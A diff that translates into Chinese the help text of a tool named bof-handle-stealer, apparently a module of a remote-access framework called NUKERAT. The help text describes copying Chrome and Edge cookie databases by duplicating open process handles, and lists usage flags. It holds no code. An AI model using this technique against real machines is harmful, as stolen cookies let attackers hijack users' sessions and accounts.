@@ -1,16 +1,16 @@
-ABOUT
+关于
     Finds Chrome or Edge NetworkService processes, duplicates an open handle
     to the Cookies SQLite database, and saves a copy to
     %LOCALAPPDATA%\<pid>.db. Scans chrome.exe and msedge.exe processes
     automatically.
-USAGE:
+用法：
     bof-handle-stealer
-EXAMPLES:
+示例：
     bof-handle-stealer
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     bof-handle-stealer -w 60
     bof-handle-stealer -bg
